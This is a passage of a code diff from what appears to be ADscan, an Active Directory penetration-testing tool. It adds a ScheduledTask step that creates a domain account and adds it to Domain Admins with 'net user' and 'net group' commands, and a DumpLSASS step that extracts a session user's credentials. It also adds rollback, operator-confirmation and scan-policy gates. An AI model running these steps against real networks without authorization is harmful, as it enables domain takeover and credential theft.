+                        summary=summary,
+                        event_stage="step_succeeded",
+                        message=(
+                            f"HasSession confirmed: {mark_sensitive(session_user, 'user')} "
+                            f"is logged on to {mark_sensitive(target_host, 'hostname')} "
+                            "and the executing actor administers it."
+                        ),
+                        step_index=idx,
+                        total_steps=total_executable_steps,
+                        executable_step_index=executable_step_position,
+                        last_executable_idx=last_executable_idx,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_status="success",
+                        actor=exec_username,
+                        target_host=target_host,
+                    )
+                continue
+
+            if key == "scheduledtask":
+                # The ScheduledTask step: register a Task Scheduler task whose
+                # principal is the session user's interactive token, run the
+                # privileged-account plan through it, verify and roll back. It is
+                # the step that owns every write the old HasSession branch made.
+                if not from_label or not to_label:
+                    print_warning(
+                        "Cannot execute ScheduledTask: missing from/to details."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Missing from/to details",
+                    )
+                    return execution_started
+
+                target_host, session_host_label, session_user = (
+                    _resolve_session_followup_context(
+                        shell,
+                        domain=domain,
+                        steps=steps,
+                        step_index=idx,
+                        relation=key,
+                        from_label=from_label,
+                    )
+                )
+                if not target_host or not session_host_label:
+                    print_warning(
+                        "Cannot execute ScheduledTask: the session host is not "
+                        "resolvable from the HasSession step before it."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Session host is not resolvable",
+                    )
+                    return execution_started
+                if not session_user or not _is_valid_domain_username(
+                    session_user, allow_machine=True
+                ):
+                    print_warning(
+                        "Cannot execute ScheduledTask: session user is not resolvable."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Session user is not resolvable",
+                    )
+                    return execution_started
+
+                if (
+                    ensure_host_bound_workflow_target_viable(
+                        shell,
+                        domain=domain,
+                        target_host=target_host,
+                        workflow_label="ScheduledTask exploitation",
+                        service="smb",
+                        resume_after_pivot=True,
+                    )
+                    is None
+                ):
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="blocked",
+                        reason="Session host is not reachable from the current vantage",
+                    )
+                    return execution_started
+
+                # One actor resolution path (the SSOT), sourced at the session
+                # HOST: the follow-up's acting credential is the local-admin
+                # foothold on that host (a proven AdminTo earlier in this path,
+                # then the source-owned principal), never the session user.
+                task_actor = resolve_step_execution_actor(
+                    shell,
+                    domain=domain,
+                    relation=key,
+                    from_label=session_host_label,
+                    to_label=session_host_label,
+                    summary=summary,
+                    context_username=context_username,
+                    context_password=context_password,
+                    steps=steps,
+                    step_index=idx,
+                    strict_source=False,
+                    interactive=True,
+                )
+                exec_username = task_actor.username if task_actor else ""
+                password = task_actor.secret if task_actor else ""
+                exec_context_source = task_actor.source if task_actor else "unresolved"
+                if not exec_username or not password:
+                    no_actor_reason = render_manufactured_followup_precondition_warning(
+                        relation=action,
+                        host=target_host,
+                        steps=steps,
+                        step_index=idx,
+                        from_label=from_label,
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason=no_actor_reason,
+                    )
+                    return execution_started
+                if exec_context_source == ACTOR_SOURCE_SCOPED_TICKET:
+                    print_warning(
+                        "Cannot execute ScheduledTask: the only access to the session "
+                        "host is a scoped service ticket, which cannot register the task."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Only a scoped service ticket is available for the host",
+                    )
+                    return execution_started
+                if exec_context_source == ACTOR_SOURCE_SOURCE_OWNED:
+                    print_info_debug(
+                        "[scheduledtask] No prior host-access credential context "
+                        "for this host; using the source-owned execution credential."
                     )
 
                 non_interactive = is_non_interactive(shell)
 
-                # Create-new-vs-reuse-an-owned + elevation SCOPE, routed through
-                # the shared SSOT (privileged_account_provisioning.py) so this
-                # follow-up matches the same operator choice the MSSQL
-                # SYSTEM-escalation follow-up offers, and — the actual bug fix —
-                # the elevation target is no longer hardcoded to Domain Admins:
-                # a non-DC session host resolves to the host's LOCAL
-                # Administrators group instead (a HasSession target is very
-                # often a member server, not a DC).
+                # What the step may WRITE is decided by the session user's real
+                # rights, read before any write, never by the session host's
+                # role. The commands run as that user, so:
+                #   1. the user administers the domain -> create a domain account
+                #      and add it to Domain Admins (from any host: ``/domain``
+                #      reaches the DC under that user's token);
+                #   2. the user does not -> create nothing. Every write it could
+                #      make is one the check predicts the host or the domain
+                #      will refuse, and a local Administrators account on this
+                #      host adds nothing: the executor that registers the task
+                #      already administers it. The step proves the session is
+                #      usable as that user (an identity hand-off) and stops there;
+                #   3. the rights cannot be read -> create nothing, say why.
+                session_user_administers_domain = _session_user_administers_domain(
+                    shell,
+                    domain=domain,
+                    session_user=session_user,
+                    auth_username=exec_username,
+                    auth_password=password,
+                )
+                if session_user_administers_domain is None:
+                    unknown_reason = (
+                        f"The group memberships of {session_user} could not be "
+                        "read, so ADscan created no account: whether that user "
+                        "can elevate one in the domain is unknown"
+                    )
+                    print_warning(
+                        "ScheduledTask not run: "
+                        f"{mark_sensitive(rich_markup_escape(unknown_reason), 'detail')}."
+                    )
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="unavailable",
+                            notes={
+                                "blocked_kind": "unavailable",
+                                "session_user": session_user,
+                                "target_host": target_host,
+                                "reason": unknown_reason,
+                                OUTCOME_NOTE_KEY: unknown_reason,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                        print_exception(exception=exc)
+                    return execution_started
+                if session_user_administers_domain is False:
+                    handoff_ok = _run_scheduledtask_identity_handoff(
+                        shell,
+                        domain=domain,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        target_host=target_host,
+                        session_user=session_user,
+                        exec_username=exec_username,
+                        exec_password=password,
+                        exec_context_source=exec_context_source,
+                        non_interactive=non_interactive,
+                        active_step_context=_active_step_context,
+                    )
+                    if handoff_ok is None:
+                        return execution_started
+                    execution_started = True
+                    if not handoff_ok:
+                        _halt_path_after_failed_step(
+                            action=action,
+                            from_label=from_label,
+                            to_label=to_label,
+                            step_index=idx,
+                            executable_step_position=executable_step_position,
+                            actor=exec_username,
+                            reason=(
+                                f"The session could not be used as {session_user}"
+                            ),
+                        )
+                        break
+                    continue
+
+                # Branch 1 only: create-new-vs-reuse-an-owned, through the shared
+                # SSOT (privileged_account_provisioning.py), elevated domain-wide.
                 from adscan_internal.services.privileged_account_provisioning import (  # noqa: PLC0415
                     ProvisioningAction,
                     plan_privileged_account,
@@ -16454,8 +18719,11 @@ def execute_selected_attack_path(
                         str(user): str(secret or "")
                         for user, secret in stored_creds.items()
                         if isinstance(user, str)
-                        and _is_valid_domain_username(_normalize_account(user))
                         and str(user).strip().lower() != exec_username.strip().lower()
+                        # Only domain USER accounts are reused; the kind comes from
+                        # the principal-kind SSOT, never from the stored key's shape.
+                        and str(_resolve_from_node_kind(shell, domain, user) or "").lower()
+                        == "user"
                     }
                     if isinstance(stored_creds, dict)
                     else {}
@@ -16469,7 +18737,8 @@ def execute_selected_attack_path(
                     default_account_secret=default_generated_password,
                     domains_data=getattr(shell, "domains_data", None),
                     reuse_pool=reuse_pool,
-                    prompt_title="HasSession exploitation mode",
+                    prompt_title="ScheduledTask exploitation mode",
+                    acting_principal_domain_admin=True,
                 )
                 if plan.is_cancelled:
                     return execution_started
@@ -16490,7 +18759,7 @@ def execute_selected_attack_path(
                     selected_user = _normalize_account(selected_user)
                     if not _is_valid_domain_username(selected_user):
                         print_warning(
-                            "Cannot execute HasSession: invalid new username. "
+                            "Cannot execute ScheduledTask: invalid new username. "
                             "Use 1-20 chars with letters, digits, dot, underscore or hyphen."
                         )
                         return execution_started
@@ -16508,7 +18777,7 @@ def execute_selected_attack_path(
                     )
                     if not policy_ok:
                         print_warning(
-                            "Cannot execute HasSession: the chosen password does not "
+                            "Cannot execute ScheduledTask: the chosen password does not "
                             "satisfy the domain password policy "
                             f"({'; '.join(policy_unmet) or 'complexity/length'})."
                         )
@@ -16519,7 +18788,7 @@ def execute_selected_attack_path(
                     target_user = _normalize_account(plan.account_name)
                     if not _is_valid_domain_username(target_user):
                         print_warning(
-                            "Cannot execute HasSession: invalid target username."
+                            "Cannot execute ScheduledTask: invalid target username."
                         )
                         return execution_started
                     target_password = plan.account_secret
@@ -16560,7 +18829,7 @@ def execute_selected_attack_path(
                         ]
                     ),
                     title=Text(
-                        "HasSession Exploitation Plan",
+                        "ScheduledTask Exploitation Plan",
                         style=f"bold {BRAND_COLORS['info']}",
                     ),
                     border_style=BRAND_COLORS["info"],
@@ -16568,7 +18837,7 @@ def execute_selected_attack_path(
                 )
 
                 if not non_interactive and not Confirm.ask(
-                    "Execute HasSession exploitation now?",
+                    "Execute ScheduledTask exploitation now?",
                     default=True,
                 ):
                     return execution_started
@@ -16600,6 +18869,7 @@ def execute_selected_attack_path(
                         "username": exec_username,
                         "target_host": target_host,
                         "session_user": session_user,
+                        "acting_principal_samaccountname": session_user,
                         "target_user": target_user,
                         "mode": mode_label,
                         "exec_context_source": exec_context_source,
@@ -16624,6 +18894,7 @@ def execute_selected_attack_path(
                                 "username": exec_username,
                                 "target_host": target_host,
                                 "session_user": session_user,
+                                "acting_principal_samaccountname": session_user,
                                 "target_user": target_user,
                                 "mode": mode_label,
                                 "exec_context_source": exec_context_source,
@@ -16642,6 +18913,10 @@ def execute_selected_attack_path(
                     group_verb = "group" if is_dc_target else "localgroup"
 
                     command_failed = False
+                    # Why the step did not reach its goal, in the client's terms:
+                    # the command the host refused, or a change that did not
+                    # appear on the re-read. Recorded on the step's edge.
+                    failure_reason = ""
                     if create_new_user and target_password is not None:
                         create_command = (
                             f'net user "{target_user}" "{target_password}" /add{domain_flag}'
@@ -16663,9 +18938,7 @@ def execute_selected_attack_path(
                             # it and a session that dies before rollback reports it
                             # as manual_required (ledger.finalize), instead of the
                             # account living only in the private checkpoint file.
-                            _hs_ledger = getattr(
-                                shell, "environment_change_ledger", None
-                            )
+                            _hs_ledger = ledger_or_warn(shell)
                             if _hs_ledger is not None:
                                 try:
                                     from adscan_internal.services import (  # noqa: PLC0415
@@ -16686,9 +18959,9 @@ def execute_selected_attack_path(
                                             "credential_lookup_domain": domain,
                                         },
                                         method=(
-                                            "HasSession (create account)"
+                                            "ScheduledTask (create account)"
                                             if is_dc_target
-                                            else "HasSession (create local account)"
+                                            else "ScheduledTask (create local account)"
                                         ),
                                     )
                                     _hs_ledger.set_revert_metadata(
@@ -16733,8 +19006,15 @@ def execute_selected_attack_path(
                                     "Target user already exists. Continuing with group escalation."
                                 )
                             else:
+                                failure_reason = _hassession_refusal_reason(
+                                    f"Creating the account {target_user} as "
+                                    f"{session_user} was refused",
+                                    create_output,
+                                )
                                 print_warning(
-                                    "HasSession user-creation command did not complete successfully."
+                                    "ScheduledTask user-creation command did not complete "
+                                    "successfully: "
+                                    f"{mark_sensitive(rich_markup_escape(failure_reason), 'detail')}"
                                 )
                                 command_failed = True
 
@@ -16747,7 +19027,7 @@ def execute_selected_attack_path(
                                 f'net {group_verb} "{group_name}" "{target_user}" '
                                 f'/add{domain_flag}'
                             )
-                            add_ok, _ = _run_hassession_schtask_command(
+                            add_ok, add_output = _run_hassession_schtask_command(
                                 shell,
                                 domain=domain,
                                 exec_username=exec_username,
@@ -16758,6 +19038,11 @@ def execute_selected_attack_path(
                                 log_suffix=f"addmember_{group_name}",
                             )
                             if not add_ok:
+                                failure_reason = _hassession_refusal_reason(
+                                    f"Adding {target_user} to {group_name} as "
+                                    f"{session_user} was refused",
+                                    add_output,
+                                )
                                 continue
                             _hs_user_added_to_da = True
                             if not waited_for_membership:
@@ -16836,6 +19121,7 @@ def execute_selected_attack_path(
                                 "username": exec_username,
                                 "target_host": target_host,
                                 "session_user": session_user,
+                                "acting_principal_samaccountname": session_user,
                                 "target_user": target_user,
                                 "mode": mode_label,
                                 "group": selected_group
@@ -16849,13 +19135,13 @@ def execute_selected_attack_path(
 
                         if is_dc_target:
                             print_info(
-                                "HasSession escalation confirmed: "
+                                "ScheduledTask escalation confirmed: "
                                 f"{mark_sensitive(target_user, 'user')} is now in "
                                 "Domain Admins (RID 512)."
                             )
                         else:
                             print_info(
-                                "HasSession escalation confirmed: "
+                                "ScheduledTask escalation confirmed: "
                                 f"{mark_sensitive(target_user, 'user')} is now in the "
                                 f"local Administrators group on {marked_host} "
                                 "(host-local, not domain-wide)."
@@ -16880,9 +19166,7 @@ def execute_selected_attack_path(
                             # (same gate as the runtime-snapshot add below), so a
                             # reused pre-existing membership ADscan did not create is
                             # never recorded as its write.
-                            _hs_ledger = getattr(
-                                shell, "environment_change_ledger", None
-                            )
+                            _hs_ledger = ledger_or_warn(shell)
                             if _hs_ledger is not None:
                                 try:
                                     from adscan_internal.services import (  # noqa: PLC0415
@@ -16909,9 +19193,9 @@ def execute_selected_attack_path(
                                             "credential_lookup_domain": domain,
                                         },
                                         method=(
-                                            "HasSession (Domain Admins)"
+                                            "ScheduledTask (Domain Admins)"
                                             if is_dc_target
-                                            else "HasSession (local Administrators)"
+                                            else "ScheduledTask (local Administrators)"
                                         ),
                                     )
                                     _hs_ledger.set_revert_metadata(
@@ -16942,7 +19226,7 @@ def execute_selected_attack_path(
                                             "target_host": target_host,
                                         },
                                         origin_kind="directory_write",
-                                        origin_technique="hassession",
+                                        origin_technique="scheduledtask",
                                         origin_relation="AddMember",
                                         cleanup_behavior="remove_directory_and_runtime",
                                     )
@@ -17005,6 +19289,16 @@ def execute_selected_attack_path(
                                     "skipping add_credential post-flow trigger."
                                 )
                     else:
+                        elevation_group = (
+                            "Domain Admins" if is_dc_target else "local Administrators"
+                        )
+                        if not failure_reason:
+                            # Every command ran and was accepted; the change is
+                            # what the re-read did not find.
+                            failure_reason = (
+                                f"{target_user} did not appear in {elevation_group} "
+                                "when the membership was read back"
+                            )
                         try:
                             update_edge_status_by_labels(
                                 shell,
@@ -17017,16 +19311,24 @@ def execute_selected_attack_path(
                                     "username": exec_username,
                                     "target_host": target_host,
                                     "session_user": session_user,
+                                    "acting_principal_samaccountname": session_user,
                                     "target_user": target_user,
                                     "mode": mode_label,
                                     "exec_context_source": exec_context_source,
+                                    "elevation_scope": (
+                                        "domain" if is_dc_target else "local"
+                                    ),
+                                    "reason": failure_reason,
+                                    OUTCOME_NOTE_KEY: failure_reason,
                                 },
                             )
                         except Exception as exc:  # noqa: BLE001
                             telemetry.capture_exception(exc)
+                            print_exception(exception=exc)
                         print_warning(
-                            "HasSession exploitation executed, but Domain Admin "
-                            "membership could not be verified."
+                            "ScheduledTask exploitation did not establish "
+                            f"{elevation_group} membership: "
+                            f"{mark_sensitive(rich_markup_escape(failure_reason), 'detail')}."
                         )
                         hassession_step_failed = True
 
@@ -17035,43 +19337,27 @@ def execute_selected_attack_path(
                     # handled separately via the checkpoint file; this covers
                     # the normal execution path (happy and sad).
                     if _hs_user_created_by_us or _hs_user_added_to_da:
-                        _hs_group_reverted, _hs_account_reverted = (
-                            _run_hassession_rollback(
-                                shell,
-                                domain=domain,
-                                exec_username=exec_username,
-                                exec_password=password,
-                                target_host=target_host,
-                                session_user=session_user,
-                                target_user=target_user,
-                                target_password=target_password,
-                                user_created_by_us=_hs_user_created_by_us,
-                                group_candidates=group_candidates,
-                                non_interactive=non_interactive,
-                                is_dc_target=is_dc_target,
-                            )
-                        )
-                        # Settle the ledger records for the DA account against
-                        # the rollback outcome. reverted_confirmed is fail-closed:
-                        # it is claimed only when the rollback reported the undo
-                        # AND a confirming re-read shows the principal is no longer
-                        # a Domain Admin. Anything less is manual_required naming
-                        # the object, so the client cleanup checklist always
-                        # carries a DA account ADscan could not prove it removed.
-                        _settle_hassession_ledger_records(
+                        # Undo through the shared revert precedence; each record
+                        # settles reverted_confirmed only on a confirming re-read,
+                        # otherwise manual_required naming the account, so the
+                        # client cleanup checklist always carries a Domain Admin
+                        # account ADscan could not prove it removed.
+                        _revert_hassession_changes(
                             shell,
                             domain=domain,
                             target_user=target_user,
+                            target_password=target_password,
                             exec_username=exec_username,
                             exec_password=password,
                             is_dc_target=is_dc_target,
                             target_host=target_host,
                             session_user=session_user,
+                            group_candidates=group_candidates,
+                            user_created_by_us=_hs_user_created_by_us,
                             user_change_id=_hs_user_change_id,
                             group_change_id=_hs_group_change_id,
-                            group_reverted=_hs_group_reverted,
-                            account_reverted=_hs_account_reverted,
                             selected_group=selected_group,
+                            membership_verified=verified_da,
                         )
                         _clear_hassession_cleanup_checkpoint(shell, domain=domain)
                 if hassession_step_failed:
@@ -17086,9 +19372,9 @@ def execute_selected_attack_path(
                         executable_step_position=executable_step_position,
                         actor=exec_username,
                         reason=(
-                            "HasSession exploitation did not establish the privileged "
-                            "membership the downstream steps depend on (it was rolled "
-                            "back)"
+                            "ScheduledTask exploitation did not establish the privileged "
+                            "membership the downstream steps depend on"
+                            + (f": {failure_reason}" if failure_reason else "")
                         ),
                     )
                     break
@@ -17134,6 +19420,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -17179,6 +19466,7 @@ def execute_selected_attack_path(
                             from_label,
                             to_label,
                             kind="unavailable",
+                            announce=False,  # the caller printed its own warning just above
                             reason="Edge missing delegated_spn (stale graph?)",
                         )
                         return execution_started
@@ -17219,6 +19507,7 @@ def execute_selected_attack_path(
                     )
                     _mark_blocked_step(
                         action, from_label, to_label, kind="unavailable",
+                                                      announce=False,  # the caller printed its own warning just above
                         reason="Edge missing delegated_spn (stale graph?)",
                     )
                     return execution_started
@@ -17238,6 +19527,7 @@ def execute_selected_attack_path(
                     )
                     _mark_blocked_step(
                         action, from_label, to_label, kind="unavailable",
+                                                      announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -17387,6 +19677,7 @@ def execute_selected_attack_path(
                     )
                     _mark_blocked_step(
                         action, from_label, to_label, kind="unavailable",
+                                                      announce=False,  # the caller printed its own warning just above
                         reason="No owned SPN-bearing trustee member",
                     )
                     return execution_started
@@ -17430,6 +19721,7 @@ def execute_selected_attack_path(
                     )
                     _mark_blocked_step(
                         action, from_label, to_label, kind="unavailable",
+                                                      announce=False,  # the caller printed its own warning just above
                         reason=(
                             "Trustee member credential is ccache-only (no long-term key)"
                             if _member_is_ccache_only
@@ -17627,6 +19919,7 @@ def execute_selected_attack_path(
                         )
                         _mark_blocked_step(
                             action, from_label, to_label, kind="unavailable",
+                                                          announce=False,  # the caller printed its own warning just above
                             reason="No impersonation target selected",
                         )
                     else:
@@ -17660,6 +19953,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing source host details",
                     )
                     return execution_started
@@ -17679,6 +19973,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Source node is not a resolvable host",
                     )
                     return execution_started
@@ -17728,7 +20023,7 @@ def execute_selected_attack_path(
                     # credential for the host machine account instead (the old
                     # wording) pointed the operator at something they never set
                     # out to own.
-                    render_manufactured_followup_precondition_warning(
+                    no_actor_reason = render_manufactured_followup_precondition_warning(
                         relation=action,
                         host=source_host,
                         steps=steps,
@@ -17740,9 +20035,8 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
-                        reason=(
-                            "No session or credential provides the required privilege"
-                        ),
+                        announce=False,  # the caller printed its own warning just above
+                        reason=no_actor_reason,
                     )
                     return execution_started
 
@@ -17759,6 +20053,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Dump executor unavailable",
                     )
                     return execution_started
@@ -17846,9 +20141,168 @@ def execute_selected_attack_path(
                     )
                 continue
 
+            if key == "dumplsass":
+                # The DumpLSASS step: read the session user's credentials out of
+                # the session host's LSASS through the native dump path (method
+                # selection, endpoint-posture notes, remote-artefact disclosure
+                # and ledger handling all live there). It is the second follow-up
+                # of a HasSession step and acts on the host that step starts at.
+                target_host, session_host_label, session_user = (
+                    _resolve_session_followup_context(
+                        shell,
+                        domain=domain,
+                        steps=steps,
+                        step_index=idx,
+                        relation=key,
+                        from_label=from_label,
+                    )
+                )
+                if not target_host or not session_host_label:
+                    print_warning(
+                        "Cannot execute DumpLSASS: the session host is not "
+                        "resolvable from the HasSession step before it."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Session host is not resolvable",
+                    )
+                    return execution_started
+                if not session_user or not _is_valid_domain_username(
+                    session_user, allow_machine=True
+                ):
+                    print_warning(
+                        "Cannot execute DumpLSASS: session user is not resolvable."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Session user is not resolvable",
+                    )
+                    return execution_started
+
+                # Same single resolution path as DumpLSA: the actor SSOT, sourced
+                # at the session host (the dump authenticates to that host).
+                lsass_actor = resolve_step_execution_actor(
+                    shell,
+                    domain=domain,
+                    relation=key,
+                    from_label=session_host_label,
+                    to_label=from_label,
+                    summary=summary,
+                    context_username=context_username,
+                    context_password=context_password,
+                    steps=steps,
+                    step_index=idx,
+                    strict_source=False,
+                    interactive=True,
+                )
+                if lsass_actor is None or not lsass_actor.username or not lsass_actor.secret:
+                    no_actor_reason = render_manufactured_followup_precondition_warning(
+                        relation=action,
+                        host=target_host,
+                        steps=steps,
+                        step_index=idx,
+                        from_label=from_label,
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason=no_actor_reason,
+                    )
+                    return execution_started
+                exec_username = lsass_actor.username
+                password = lsass_actor.secret
+                print_info_debug(
+                    f"attack_paths {action}: actor resolved for "
+                    f"{mark_sensitive(exec_username, 'user')} on "
+                    f"{mark_sensitive(target_host, 'hostname')} "
+                    f"source={mark_sensitive(lsass_actor.source, 'detail')}"
+                )
+
+                lsass_handler = getattr(shell, "dump_lsass", None)
+                if not callable(lsass_handler):
+                    print_warning(
+                        "Cannot execute DumpLSASS: dump executor is unavailable."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Dump executor unavailable",
+                    )
+                    return execution_started
+
+                lsass_notes = {
+                    "username": exec_username,
+                    "target_host": target_host,
+                    "session_user": session_user,
+                }
+                execution_started = True
+                with _active_step_context(
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes=lsass_notes,
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="attempted",
+                            notes=lsass_notes,
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    lsass_handler(
+                        domain,
+                        target_host,
+                        exec_username,
+                        password,
+                        lsass_actor.islocal,
+                    )
+
+                recovered_credential = _resolve_domain_password(
+                    shell, domain, session_user
+                )
+                if not recovered_credential:
+                    # Honest non-completion: the step stays ``attempted``. Which
+                    # method ran, and whether endpoint protection interrupted
+                    # every low-footprint one, is recorded by the dump path.
+                    marked_user = mark_sensitive(session_user, "user")
+                    print_warning(
+                        f"{action} did not recover a credential for {marked_user}. "
+                        "Stopping this path."
+                    )
+                    return True
+                _handle_successful_credential_step(
+                    action,
+                    from_label,
+                    to_label,
+                    notes=lsass_notes,
+                    captured_principal=session_user,
+                    captured_credential=recovered_credential,
+                )
+                continue
+
             if key == "backupoperatorescalation":
                 from adscan_internal.cli.backup_operators_escalation import (
                     offer_backup_operators_escalation,
+                    read_backup_ops_exercised_notes,
                 )
                 bo_username = _resolve_execution_user(
                     shell,
@@ -17873,11 +20327,16 @@ def execute_selected_attack_path(
                     status="attempted",
                     notes={"user": bo_username},
                 )
+                # The step's own target is handed to the executor rather than
+                # letting it choose a controller of its own: the graph pinned one
+                # when the path was built, and one decision taken once is what
+                # keeps the displayed chain and the executed action in agreement.
                 success = offer_backup_operators_escalation(
                     shell,
                     domain=domain,
                     username=bo_username,
                     password=bo_password,
+                    target_label=to_label,
                 )
                 if success:
                     _update_attack_path_step_status_at_index(
@@ -17886,7 +20345,12 @@ def execute_selected_attack_path(
                         summary=summary,
                         step_index=idx - 1,
                         status="success",
-                        notes={"user": bo_username},
+                        notes={
+                            "user": bo_username,
+                            # Write back the controller actually exercised, which
+                            # a live fallback may have moved off the pin.
+                            **read_backup_ops_exercised_notes(shell, domain=domain),
+                        },
                     )
                     # Promote the recovered DC machine-account credential
                     # (emitted by offer_backup_operators_escalation) into the
@@ -18452,7 +20916,7 @@ def offer_attack_paths_with_non_high_value_fallback(
         target_mode=target_mode,
     )
 
-    fallback_default = str(getattr(shell, "type", "")).strip().lower() == "ctf"
+    fallback_default = policy_settings.expands_scope_automatically(shell)
     marked_domain = mark_sensitive(domain, "domain")
     subject = "owned users" if start_norm == "owned" else mark_sensitive(start, "user")
 
@@ -18721,14 +21185,31 @@ def _apply_attack_path_policy(
         ATTACK_PATH_POLICY_SELECTED,
     )
 
+    from adscan_core.scan_policy.execution import (  # noqa: PLC0415
+        DECISION_MAP_ONLY,
+        execution_decision,
+    )
+
+    if execution_decision(shell) == DECISION_MAP_ONLY:
+        # The scan policy leaves each attack step to an operator and this run
+        # has none: map, never execute. The coverage block discloses it and the
+        # report marks every enabled step as left to an operator.
+        print_info(
+            "Attack-path execution skipped: the scan policy leaves each attack step "
+            "to an operator, and this run has none."
+        )
+        return []
+
     scan_config = getattr(shell, "scan_config", None)
     ap_cfg = getattr(scan_config, "attack_paths", None)
     policy = getattr(ap_cfg, "policy", None)
 
     if policy == ATTACK_PATH_POLICY_NONE:
-        print_info(
-            "Attack-path execution skipped (disabled in scan configuration)."
+        from adscan_internal.services.scan_policy_notice import (  # noqa: PLC0415
+            CONFIG_SKIP_LINE,
         )
+
+        print_info(CONFIG_SKIP_LINE.format(label="Attack-path execution"))
         return []
 
     if policy == ATTACK_PATH_POLICY_SELECTED:
@@ -18770,6 +21251,7 @@ def _offer_attack_paths_for_execution_summaries_impl(
     snapshot_target: str = "highvalue",
     snapshot_target_mode: str = "object",
     auto_continue_theoretical_in_non_interactive: bool = True,
+    reexecute_exploited_default: bool = False,
     _refresh_deferred_sink: list[bool] | None = None,
 ) -> bool:
     """Shared UX loop for showing/executing already computed path summaries.
@@ -19107,8 +21589,36 @@ def _offer_attack_paths_for_execution_summaries_impl(
         # after the canonical ``[status]`` so accessibility tools that
         # parse the line still see the status as the first bracketed
         # token.
+        #
+        # A route the readiness overlay marked as not startable here (its first
+        # pending step is excluded by the scan policy, or it acts outside the
+        # engagement scope) is NOT offered: it stays in the listing above,
+        # mapped, with its reason, and never becomes a choice whose only
+        # outcome is a refusal (release gate 14.0.0: 21 routes whose first step
+        # the policy excluded were offered for execution, one preselected).
+        # ``offer_indices`` maps each offered option back to its summary index,
+        # so the numbering still matches the listing.
+        offer_indices = [
+            idx
+            for idx, summary in enumerate(summaries[:max_display])
+            if _path_offerable_for_execution(summary)
+        ]
+        not_offered = min(max_display, len(summaries)) - len(offer_indices)
+        if not offer_indices:
+            if not_offered:
+                print_info(
+                    f"{not_offered} mapped attack path(s) not offered for execution: "
+                    "their first step is excluded by your scan policy or outside "
+                    "the engagement scope."
+                )
+            print_info_debug(
+                "[attack_paths] no offerable path: "
+                f"domain={marked_domain} not_offered={not_offered}"
+            )
+            return executed
         options = []
-        for idx, summary in enumerate(summaries[:max_display]):
+        for idx in offer_indices:
+            summary = summaries[idx]
             label = (
                 f"{idx + 1}. {summary.get('source')} -> "
                 f"{summary.get('target')} [{summary.get('status')}]"
@@ -19145,6 +21655,7 @@ def _offer_attack_paths_for_execution_summaries_impl(
                         desired_statuses_set,
                     )
                     and not _path_was_attempted_this_session(summary)
+                    and _path_offerable_for_execution(summary)
                 )
                 for summary in summaries
             )
@@ -19153,11 +21664,11 @@ def _offer_attack_paths_for_execution_summaries_impl(
         if default_idx == skip_idx:
             default_idx = next(
                 (
-                    idx
-                    for idx, summary in enumerate(summaries[:max_display])
-                    if _is_theoretical_status(summary.get("status"))
+                    position
+                    for position, idx in enumerate(offer_indices)
+                    if _is_theoretical_status(summaries[idx].get("status"))
                     and idx not in _tried_idx_set
-                    and not _path_was_attempted_this_session(summary)
+                    and not _path_was_attempted_this_session(summaries[idx])
                 ),
                 skip_idx,
             )
@@ -19174,6 +21685,17 @@ def _offer_attack_paths_for_execution_summaries_impl(
                         "category": "attack_path_execution",
                         "domain": domain,
                         "candidate_count": len(summaries),
+                        # Which route each option IS, and which mapped routes
+                        # are not a choice and why, so a remote console renders
+                        # this offer and answers by option index, never by
+                        # rebuilding it from its own route list.
+                        **build_path_offer_context(
+                            summaries,
+                            offer_indices,
+                            max_display=max_display,
+                            offerable=_path_offerable_for_execution,
+                            domain=domain,
+                        ),
                     },
                 )
             except TypeError:
@@ -19185,7 +21707,11 @@ def _offer_attack_paths_for_execution_summaries_impl(
         elif non_interactive:
             selected_idx = default_idx
         else:
